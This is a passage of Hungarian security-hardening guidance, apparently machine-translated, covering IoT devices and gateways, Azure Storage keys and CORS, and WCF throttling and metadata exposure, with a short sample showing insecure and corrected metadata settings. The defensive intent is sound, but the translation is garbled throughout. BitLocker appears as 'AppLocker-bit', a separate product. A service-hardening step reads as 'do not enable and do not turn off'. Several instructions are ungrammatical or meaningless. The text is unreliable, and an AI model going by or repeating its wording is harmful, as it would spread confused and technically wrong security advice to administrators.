| **Összetevő**               | IoT-eszközök | 
| **SDL fázis**               | Környezet |  
| **Alkalmazandó technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | N/A  |
| **Lépések** | Bármely felügyeleti felületek, amely az eszköz vagy mező átjáró mutatja meg kell-e titkosítani erős hitelesítő adataival. Is bármely egyéb kitett felületek, például Wi-Fi, SSH, fájlmegosztások, FTP titkosítani kell erős hitelesítő adatokkal. Alapértelmezett érték a gyenge jelszavakat nem lehet használni. |

## <a id="unknown-exe"></a>Győződjön meg arról, hogy ismeretlen kód nem hajtható végre olyan eszközök

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | IoT-eszközök | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazandó technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | [A biztonságos rendszerindítás és az AppLocker-bit Eszköztitkosítás a Windows 10 IoT Core engedélyezése](https://developer.microsoft.com/windows/iot/win10/sb_bl) |
| **Lépések** | UEFI biztonságos rendszerindítás korlátozza a rendszer csak a megadott hatóság aláírásával bináris fájlok futtatását teszi lehetővé. Ez a szolgáltatás megakadályozó ismeretlen kód végrehajtása a platform és potenciálisan gyengítése azt a biztonsági állapotát. Engedélyezze a UEFI biztonságos rendszerindítás, és korlátozhatja az tartozó kód aláírása megbízható tanúsítványszolgáltatók listáját. Az eszközt a megbízható hitelesítésszolgáltatók telepített összes kód aláírása. |

## <a id="partition-iot"></a>Az operációs rendszer és az AppLocker-bit az IoT-eszközök további partíciók titkosítása

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | IoT-eszközök | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazandó technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | N/A  |
| **Lépések** | Windows 10 IoT Core megvalósítja az Eszköztitkosítás bit-tároló, erős függőség, hogy tartalmazza a platformon, beleértve a szükséges preOS protokoll, amely a szükséges mérési adatokon végez UEFI TPM Modullal rendelkező egyszerűsített verziója. E preOS mérések ügyeljen arra, hogy az operációs rendszer újabb hogyan elindult az operációs rendszer végleges rekordja. Az operációs rendszer partíciók bit-tároló és a további partíciókat is használ, ha azokat a bizalmas adatokat tárolhatnak titkosításához. |

## <a id="min-enable"></a>Győződjön meg arról, hogy csak a minimális szolgáltatások vagy szolgáltatások engedélyezve vannak-e az eszközökön

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | IoT-eszközök | 
| **SDL fázis**               | Környezet |  
| **Alkalmazandó technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | N/A  |
| **Lépések** | Ne engedélyezze és ne kapcsolja ki a szolgáltatások vagy az operációs rendszer, amelyre nincs szükség a megoldás működéséhez a szolgáltatások. A például ha az eszköz nem igényli a központi felhasználói Felületet, telepítse a Windows IoT távfelügyeleti módban. |

## <a id="field-bit-locker"></a>Az operációs rendszer és az AppLocker-bit IoT mező átjáró további partíciók titkosítása

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Az IoT-mező átjáró | 
| **SDL fázis**               | Környezet |  
| **Alkalmazandó technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | N/A  |
| **Lépések** | Windows 10 IoT Core megvalósítja az Eszköztitkosítás bit-tároló, erős függőség, hogy tartalmazza a platformon, beleértve a szükséges preOS protokoll, amely a szükséges mérési adatokon végez UEFI TPM Modullal rendelkező egyszerűsített verziója. E preOS mérések ügyeljen arra, hogy az operációs rendszer újabb hogyan elindult az operációs rendszer végleges rekordja. Az operációs rendszer partíciók bit-tároló és a további partíciókat is használ, ha azokat a bizalmas adatokat tárolhatnak titkosításához. |

## <a id="default-change"></a>Győződjön meg arról, hogy az alapértelmezett bejelentkezési hitelesítő adatokat, a mező átjáró telepítésekor legyenek módosítva

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Az IoT-mező átjáró | 
| **SDL fázis**               | Környezet |  
| **Alkalmazandó technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | N/A  |
| **Lépések** | Győződjön meg arról, hogy az alapértelmezett bejelentkezési hitelesítő adatokat, a mező átjáró telepítésekor legyenek módosítva |

## <a id="cloud-firmware"></a>Győződjön meg arról, hogy az átjáró megvalósítja-e olyan folyamatot, amely a csatlakoztatott eszközök belső vezérlőprogram naprakészen tartása

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Az IoT átjáró | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazandó technológiák** | Általános |
| **Attribútumok**              | Átjáró choice - Azure IoT Hub |
| **Hivatkozások**              | [Az IoT Hub eszköz kezelése-áttekintés](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [eszköz belső vezérlőprogram frissítése](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-device-jobs/) |
| **Lépések** | LWM2M egy olyan protokoll, az IoT-felügyeleti a nyitott Mobile Alliance. Az Azure IoT-eszközfelügyeleti lehetővé teszi a fizikai eszközök eszköz feladatok segítségével kommunikál. Győződjön meg arról, hogy az átjáró megvalósítja-e olyan folyamatot, amely rendszeresen megtartja-e az eszköz és más konfigurációs adatokat használó Azure IoT Hub Eszközkezelés dátummal záródó részéből. |

## <a id="controls-policies"></a>Győződjön meg arról, hogy eszközök szervezeti házirendek szerint beállított végpont biztonsági vezérlő

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Gép megbízhatósági kapcsolat határán | 
| **SDL fázis**               | Környezet |  
| **Alkalmazandó technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | N/A  |
| **Lépések** | Győződjön meg arról, hogy eszközök végponti biztonsági vezérlők, például a lemez szintű titkosítást, a víruskereső frissített aláírásokkal bit-tárolót, gazdagép alapú tűzfal, az operációs rendszer frissítései, a csoport házirendek stb szervezeti biztonsági házirendek megfelelően vannak konfigurálva. |

## <a id="secure-keys"></a>Az Azure storage elérési kulcsok biztonságos kezelése

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Azure Storage | 
| **SDL fázis**               | Környezet |  
| **Alkalmazandó technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | [Az Azure Storage biztonsági útmutató - a Tárfiók kulcsait kezelése](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| **Lépések** | <p>Kulcstároló: Javasoljuk, hogy az Azure Storage elérési kulcsok tárolása az Azure Key Vault valamilyen titkos adatot, és az alkalmazásokat, a kulcs lekérése kulcstároló. Ez az alábbi okokból ajánlott:</p><ul><li>Az alkalmazás soha nem lesz a tárolási kulcs szoftveresen kötött a konfigurációs fájlban, amely egy, a kulcsok külön engedélye nélkül hozzáférést az adott erőfeszítések eltávolítja</li><li>A kulcsoknak Access Azure Active Directory használatával lehet irányítani. Ez azt jelenti, hogy a fiók tulajdonosának hozzáférést biztosíthat a néhány olyan alkalmazásokat, amelyek a kulcsok lekérése az Azure Key Vault kell. Más alkalmazások nem tudják a hívóbetűk őket engedély megadása kifejezetten nélkül</li><li>Kulcs újragenerálása: Javasoljuk, hogy rendelkezik egy folyamatot, hogy biztonsági okokból Azure tárelérési kulcsok újragenerálása. Arról, hogy miért részleteit és a kulcs újragenerálása tervezéséről az Azure Storage biztonsági útmutató áttekintésével foglalkozó cikkben ismertetett</li></ul>|

## <a id="cors-storage"></a>Győződjön meg arról, hogy csak megbízható források engedélyezve legyenek-e, ha a CORS engedélyezve van az Azure storage

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Azure Storage | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazandó technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | [Az Azure Storage szolgáltatásainak CORS-támogatás](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
| **Lépések** | Az Azure Storage lehetővé teszi a kereszt-eredetű erőforrások megosztása – a CORS engedélyezése. Minden tárfiók férhetnek hozzá a fiókhoz tartozó tárolási erőforrások tartományokat is megadhat. A CORS alapértelmezés szerint le van tiltva az összes szolgáltatás. Engedélyezheti a CORS hívja service házirendek beállítása a módszerek egyikét a REST API-t vagy a storage ügyféloldali kódtár segítségével. |

## <a id="throttling"></a>A WCF szolgáltatás szabályozásával engedélyezése

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | WCF | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazandó technológiák** | .NET-keretrendszer 3 |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [erősítse meg Királyság](https://vulncat.fortify.com/en/vulncat/index.html) |
| **Lépések** | <p>A rendszer-erőforrások nem helyezi maximális Erőforrásfogyás, és végső soron egy szolgáltatásmegtagadási eredményezheti.</p><ul><li>**Magyarázat:** Windows Communication Foundation (WCF) lehetővé teszi a szolgáltatáskérések szabályozás. Túl sok ügyfél kérésének engedélyezése a rendszer kéréssekkel, és az erőforrások lefoglalhat. Másrészről így csak kevés egy szolgáltatási kérelmet megakadályozhatják legitim felhasználók a szolgáltatás használatával. Minden szolgáltatás külön-külön legyen beállítva, hogy és konfigurálva ahhoz, hogy a megfelelő mennyiségű erőforrást.</li><li>**JAVASLATOK** engedélyezése WCF szabályozási szolgáltatás és a megadott korlát a megfelelő alkalmazás.</li></ul>|

### <a name="example"></a>Példa
A következő egy példa konfiguráció sávszélesség-szabályozás engedélyezve:
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a id="info-metadata"></a>WCF-adatokhoz való illetéktelen hozzáférés metaadatok keresztül

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | WCF | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazandó technológiák** | .NET-keretrendszer 3 |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [erősítse meg Királyság](https://vulncat.fortify.com/en/vulncat/index.html) |
| **Lépések** | Metaadatok segítségével a támadók további tudnivalók a rendszer, és tervezze meg a támadást egy formája. WCF szolgáltatások úgy konfigurálhatók teszi közzé a metaadatok. Metaadatok szolgáltatás részletes leírását tartalmazza, és nem kell éles környezetben szórási. A `HttpGetEnabled`  /  `HttpsGetEnabled` a konfigurációs ServiceMetaData osztály tulajdonságait határozza meg, hogy a szolgáltatás a metaadatok teszi közzé. | 

### <a name="example"></a>Példa
Az alábbi kódot arra utasítja a szolgáltatás metaadatai közvetíti WCF
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Éles környezetben a szolgáltatás metaadatai nem szórási. Állítsa be a HttpGetEnabled / FALSE osztály a konfigurációs ServiceMetaData HttpsGetEnabled tulajdonságait. 

### <a name="example"></a>Példa
Az alábbi kódot a szolgáltatás metaadatai nem közvetíti WCF utasítja. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
